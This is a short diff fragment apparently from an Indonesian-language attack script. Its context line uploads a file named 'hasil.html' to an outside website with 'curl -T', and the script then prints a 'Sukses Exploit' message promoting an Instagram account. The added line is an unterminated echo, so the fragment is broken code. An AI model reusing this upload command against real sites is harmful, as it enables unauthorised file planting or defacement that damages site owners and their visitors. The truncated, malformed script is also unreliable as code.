@@ -38,3 +38,4 @@ curl -T hasil.html http://apparelworld.org/
 sleep 5
 echo "[+] Sukses Exploit (Follow Instagram @wisnu_as123!";
 exit;
+echo "
